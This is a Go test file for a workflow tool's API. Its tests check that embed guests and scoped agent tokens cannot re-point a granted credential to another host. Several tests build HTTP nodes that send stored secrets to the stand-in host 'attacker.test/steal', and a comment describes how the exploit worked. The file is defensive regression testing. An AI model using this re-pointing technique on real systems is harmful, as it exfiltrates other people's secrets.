package api_test

import (
	"encoding/json"
	"net/http"
	"reflect"
	"strings"
	"testing"

	"github.com/kilaslab/kilas-flow/internal/api"
	"github.com/kilaslab/kilas-flow/internal/workflow"
)

// These tests reproduce the re-pointing exploit at the API surface it used: an
// embedded guest editor holding workflow:write, or a narrowed agent token
// holding write and run, edits a workflow so that a credential it was allowed
// to use goes to a host it controls, and runs it. The confinement checked only
// which credential ids a document attached — never where a request would take
// them — so the secret arrived at the attacker.

// storeScopedCredential stores a credential with an allowed-domains list.
func storeScopedCredential(t *testing.T, handler http.Handler, name, credentialType string, fields map[string]string, domains ...string) credentialResource {
	t.Helper()
	return requestJSON[credentialResource](t, handler, http.MethodPost, "/api/v1/credentials", map[string]any{
		"name": name, "type": credentialType, "fields": fields, "allowedDomains": domains,
	}, http.StatusCreated)
}

// httpNodeTo builds one HTTP Request node sending to url with a credential
// attached under the given type.
func httpNodeTo(id, url, credentialType, credentialID string) workflow.Node {
	return workflow.Node{
		ID: id, Name: id, Type: "kilasflow.httpRequest", TypeVersion: workflow.V(1),
		Parameters:  map[string]any{"method": "GET", "url": url},
		Credentials: map[string]string{credentialType: credentialID},
	}
}

func TestAnEmbedGuestCannotRePointAGrantedUnscopedCredential(t *testing.T) {
	handler, _, workflowID := embedServer(t)

	// The owner's workflow legitimately uses a header credential saved with no
	// allowed domains, against the one partner it was made for.
	unscoped := storeCredential(t, handler, "Partner key", "httpHeaderAuth", map[string]string{
		"name": "X-Api-Key", "value": "PARTNER-SECRET-7731",
	})
	requestJSON[workflowResource](t, handler, http.MethodPut, "/api/v1/workflows/"+workflowID,
		workflowDraft(documentReferencing("Embeddable", httpNodeTo("collect", "https://partner.test/collect", "httpHeaderAuth", unscoped.ID))),
		http.StatusOK)
	requestJSON[workflowResource](t, handler, http.MethodPost, "/api/v1/workflows/"+workflowID+"/activate", nil, http.StatusOK)

	token := mintEmbedSession(t, handler, workflowID, "workflow:read", "workflow:write", "workflow:run")

	// The credential id is granted — the published revision uses it — so the
	// old check let this through. The URL is the attacker's.
	hostile := documentReferencing("Embeddable", httpNodeTo("collect", "https://attacker.test/steal", "httpHeaderAuth", unscoped.ID))
	saved := embedRequest(t, handler, token, http.MethodPut, "/api/v1/workflows/"+workflowID, workflowDraft(hostile))
	if saved.Code != http.StatusForbidden {
		t.Fatalf("save status = %d, want 403 for an unscoped credential in a guest's document (body: %s)", saved.Code, saved.Body)
	}
	for _, want := range []string{unscoped.ID, "allowed domains"} {
		if !strings.Contains(saved.Body.String(), want) {
			t.Errorf("the refusal does not name %q: %s", want, saved.Body)
		}
	}

	// Running is refused too, even the owner's own revision: a guest who may
	// run a document holding an unscoped credential is one save away from
	// aiming it anywhere, and the run is where the secret would leave.
	run := embedRequest(t, handler, token, http.MethodPost, "/api/v1/workflows/"+workflowID+"/run", nil)
	if run.Code != http.StatusForbidden {
		t.Fatalf("run status = %d, want 403 for a revision attaching an unscoped credential (body: %s)", run.Code, run.Body)
	}

	// Scoping the credential is the fix the refusal asks for, and it restores
	// the embedded editor: the key can now only ever reach partner.test,
	// whatever URL the guest types.
	requestJSON[credentialResource](t, handler, http.MethodPut, "/api/v1/credentials/"+unscoped.ID, map[string]any{
		"name": "Partner key", "fields": map[string]string{"name": "X-Api-Key", "value": "••••••••"},
		"allowedDomains": []string{"partner.test"},
	}, http.StatusOK)
	scoped := embedRequest(t, handler, token, http.MethodPut, "/api/v1/workflows/"+workflowID,
		workflowDraft(documentReferencing("Embeddable", httpNodeTo("collect", "https://partner.test/collect", "httpHeaderAuth", unscoped.ID))))
	if scoped.Code != http.StatusOK {
		t.Fatalf("save status = %d, want 200 once the credential is scoped (body: %s)", scoped.Code, scoped.Body)
	}
}

func TestAnEmbedGuestCannotAttachAGrantedProviderKeyToAnHTTPNode(t *testing.T) {
	handler, _, workflowID := embedServer(t)

	// The owner's draft uses an OpenAI key the way it is meant to be used, on
	// the provider's model node. A draft is enough: a never-activated workflow
	// confines its session to what its latest draft references.
	key := storeCredential(t, handler, "OpenAI", "openAiApi", map[string]string{"apiKey": "sk-live-OWNER"})
	model := workflow.Node{
		ID: "model", Name: "Model", Type: "kilasflow.lmChatOpenAi", TypeVersion: workflow.V(1),
		Parameters:  map[string]any{"model": map[string]any{"__rl": true, "mode": "id", "value": "gpt-4o-mini"}},
		Credentials: map[string]string{"openAiApi": key.ID},
	}
	owner := validManualWorkflow("Embeddable")
	owner.Nodes = append(owner.Nodes, model)
	requestJSON[workflowResource](t, handler, http.MethodPut, "/api/v1/workflows/"+workflowID, workflowDraft(owner), http.StatusOK)

	token := mintEmbedSession(t, handler, workflowID, "workflow:read", "workflow:write", "workflow:run")

	// The key has a default scope, so it is not refused as unscoped, and the
	// id is granted — the save is inside the session's confinement.
	hostile := documentReferencing("Embeddable", httpNodeTo("exfil", "https://attacker.test/steal", "openAiApi", key.ID))
	saved := embedRequest(t, handler, token, http.MethodPut, "/api/v1/workflows/"+workflowID, workflowDraft(hostile))
	if saved.Code != http.StatusOK {
		t.Fatalf("save status = %d, want 200 — the draft may be saved and fixed (body: %s)", saved.Code, saved.Body)
	}
	// The run is not: an HTTP Request node does not use an OpenAI credential,
	// and the compiler refuses the attachment by name before anything runs.
	run := embedRequest(t, handler, token, http.MethodPost, "/api/v1/workflows/"+workflowID+"/run", nil)
	if run.Code != http.StatusUnprocessableEntity {
		t.Fatalf("run status = %d, want 422 for a credential type the node does not declare (body: %s)", run.Code, run.Body)
	}
	for _, want := range []string{"openAiApi", "kilasflow.httpRequest"} {
		if !strings.Contains(run.Body.String(), want) {
			t.Errorf("the refusal does not name %q: %s", want, run.Body)
		}
	}
}

func TestAScopedKeyCannotSaveOrRunAnUnscopedCredential(t *testing.T) {
	server, keys := newAuthenticatedAPI(t, "tenant-a")
	tenantKey := keys["tenant-a"]

	unscoped := server.callJSON(t, http.MethodPost, "/api/v1/credentials", tenantKey, map[string]any{
		"name": "Anywhere", "type": "httpBearerAuth", "fields": map[string]string{"token": "BEARER-SECRET-4410"},
	}, http.StatusCreated)
	scoped := server.callJSON(t, http.MethodPost, "/api/v1/credentials", tenantKey, map[string]any{
		"name": "Partner only", "type": "httpBearerAuth", "fields": map[string]string{"token": "partner"},
		"allowedDomains": []string{"partner.test"},
	}, http.StatusCreated)
	unscopedID, _ := unscoped["id"].(string)
	scopedID, _ := scoped["id"].(string)

	hostile := documentReferencing("Agent built", httpNodeTo("exfil", "https://attacker.test/steal", "httpBearerAuth", unscopedID))
	benign := documentReferencing("Agent built", httpNodeTo("call", "https://partner.test/api", "httpBearerAuth", scopedID))

	// An agent token that may create workflows: the scoped keys never had a
	// document check at all.
	agent := mintScopedKey(t, server, tenantKey, "agent", map[string]any{
		"scopes": []string{"workflow:read", "workflow:write", "workflow:run"},
	})
	created := server.call(t, http.MethodPost, "/api/v1/workflows", agent, workflowDraft(hostile))
	if created.Code != http.StatusForbidden {
		t.Fatalf("create status = %d, want 403 for an unscoped credential in an agent's document (body: %s)", created.Code, created.Body)
	}
	for _, want := range []string{"agent token", unscopedID, "allowed domains"} {
		if !strings.Contains(created.Body.String(), want) {
			t.Errorf("the refusal does not name %q: %s", want, created.Body)
		}
	}
	server.callJSON(t, http.MethodPost, "/api/v1/workflows", agent, workflowDraft(benign), http.StatusCreated)

	// A token bound to one workflow, re-pointing it.
	workflowID := server.createWorkflowAs(t, tenantKey, "Bound target")
	bound := mintScopedKey(t, server, tenantKey, "bound agent", map[string]any{
		"scopes": []string{"workflow:read", "workflow:write", "workflow:run"}, "workflowId": workflowID,
	})
	updated := server.call(t, http.MethodPut, "/api/v1/workflows/"+workflowID, bound, workflowDraft(hostile))
	if updated.Code != http.StatusForbidden {
		t.Fatalf("update status = %d, want 403 (body: %s)", updated.Code, updated.Body)
	}

	// A revision the tenant saved is the tenant's business, but the token may
	// not run it: the run is where the secret would leave.
	server.callJSON(t, http.MethodPut, "/api/v1/workflows/"+workflowID, tenantKey, workflowDraft(hostile), http.StatusOK)
	run := server.call(t, http.MethodPost, "/api/v1/workflows/"+workflowID+"/run", bound, nil)
	if run.Code != http.StatusForbidden {
		t.Fatalf("run status = %d, want 403 for a revision attaching an unscoped credential (body: %s)", run.Code, run.Body)
	}

	// A retry queues the revision the original ran rather than the latest, so
	// it is checked the same way — or an old run would be the way around it.
	finished := server.seedExecution(t, "tenant-a", tenantKey, workflowID)
	retry := server.call(t, http.MethodPost, "/api/v1/executions/"+finished.ID+"/retry", bound, nil)
	if retry.Code != http.StatusForbidden {
		t.Fatalf("retry status = %d, want 403 for a revision attaching an unscoped credential (body: %s)", retry.Code, retry.Body)
	}

	// The tenant's own key is not confined, and keeps working exactly as before.
	server.callJSON(t, http.MethodPost, "/api/v1/workflows/"+workflowID+"/run", tenantKey, nil, http.StatusAccepted)
}

// A switched-off node never runs, so an unscoped credential it still carries —
// the leftover of an import, typically — is no way to read a secret, and must
// not block a narrowed caller from saving or running the rest of the workflow.
// Switching it back on is a save, and that save is refused.
func TestAnUnscopedCredentialOnADisabledNodeDoesNotBlockAConfinedCaller(t *testing.T) {
	server, keys := newAuthenticatedAPI(t, "tenant-a")
	tenantKey := keys["tenant-a"]
	unscoped := server.callJSON(t, http.MethodPost, "/api/v1/credentials", tenantKey, map[string]any{
		"name": "Leftover", "type": "httpBearerAuth", "fields": map[string]string{"token": "LEFTOVER-SECRET"},
	}, http.StatusCreated)
	unscopedID, _ := unscoped["id"].(string)

	leftover := httpNodeTo("old", "https://partner.test/api", "httpBearerAuth", unscopedID)
	leftover.Disabled = true
	document := documentReferencing("Imported", leftover)

	workflowID := server.createWorkflowAs(t, tenantKey, "Imported")
	bound := mintScopedKey(t, server, tenantKey, "bound agent", map[string]any{
		"scopes": []string{"workflow:read", "workflow:write", "workflow:run"}, "workflowId": workflowID,
	})
	server.callJSON(t, http.MethodPut, "/api/v1/workflows/"+workflowID, bound, workflowDraft(document), http.StatusOK)
	server.callJSON(t, http.MethodPost, "/api/v1/workflows/"+workflowID+"/run", bound, nil, http.StatusAccepted)

	document.Nodes[1].Disabled = false
	enabled := server.call(t, http.MethodPut, "/api/v1/workflows/"+workflowID, bound, workflowDraft(document))
	if enabled.Code != http.StatusForbidden {
		t.Fatalf("enabling save status = %d, want 403 for the unscoped credential it switches on (body: %s)", enabled.Code, enabled.Body)
	}
}

func TestAFixedHostCredentialReadsBackWithItsDefaultScope(t *testing.T) {
	handler, _ := credentialAPI(t, api.Deps{})

	openAI := storeCredential(t, handler, "OpenAI", "openAiApi", map[string]string{"apiKey": "sk-1"})
	if !reflect.DeepEqual(openAI.AllowedDomains, []string{"api.openai.com"}) {
		t.Errorf("openAiApi allowedDomains = %v, want the default the server enforces", openAI.AllowedDomains)
	}
	gateway := storeScopedCredential(t, handler, "Gateway", "openAiApi", map[string]string{"apiKey": "sk-2"}, "gateway.example.test")
	if !reflect.DeepEqual(gateway.AllowedDomains, []string{"gateway.example.test"}) {
		t.Errorf("an authored list = %v, want it kept instead of the default", gateway.AllowedDomains)
	}

	// A Telegram credential names its own Bot API server; the scope shown is
	// that server's host, and it moves when the owner moves the base URL — even
	// though the form sends back the list it was shown.
	telegram := storeCredential(t, handler, "Bot", "telegramApi", map[string]string{
		"accessToken": "1:A", "baseUrl": "http://bot-api.internal.test:8081",
	})
	if !reflect.DeepEqual(telegram.AllowedDomains, []string{"bot-api.internal.test"}) {
		t.Fatalf("telegramApi allowedDomains = %v, want the base URL's host", telegram.AllowedDomains)
	}
	moved := requestJSON[credentialResource](t, handler, http.MethodPut, "/api/v1/credentials/"+telegram.ID, map[string]any{
		"name": "Bot", "fields": map[string]string{"accessToken": "••••••••", "baseUrl": "https://api.telegram.org"},
		"allowedDomains": telegram.AllowedDomains,
	}, http.StatusOK)
	if !reflect.DeepEqual(moved.AllowedDomains, []string{"api.telegram.org"}) {
		t.Errorf("after moving the base URL allowedDomains = %v, want the scope to follow it", moved.AllowedDomains)
	}

	// The catalogue says what an empty list means, so the form can say it too.
	recorder := requestJSON[[]struct {
		ID                 string   `json:"id"`
		DefaultDomains     []string `json:"defaultDomains"`
		DefaultDomainsFrom string   `json:"defaultDomainsFrom"`
	}](t, handler, http.MethodGet, "/api/v1/credential-types", nil, http.StatusOK)
	found := map[string]bool{}
	for _, entry := range recorder {
		switch entry.ID {
		case "openAiApi":
			found[entry.ID] = reflect.DeepEqual(entry.DefaultDomains, []string{"api.openai.com"})
		case "openRouterApi":
			found[entry.ID] = reflect.DeepEqual(entry.DefaultDomains, []string{"openrouter.ai"})
		case "telegramApi":
			found[entry.ID] = entry.DefaultDomainsFrom == "baseUrl"
		}
	}
	for _, typeID := range []string{"openAiApi", "openRouterApi", "telegramApi"} {
		if !found[typeID] {
			encoded, _ := json.Marshal(recorder)
			t.Errorf("%s carries no default scope in the catalogue: %s", typeID, encoded)
		}
	}
}
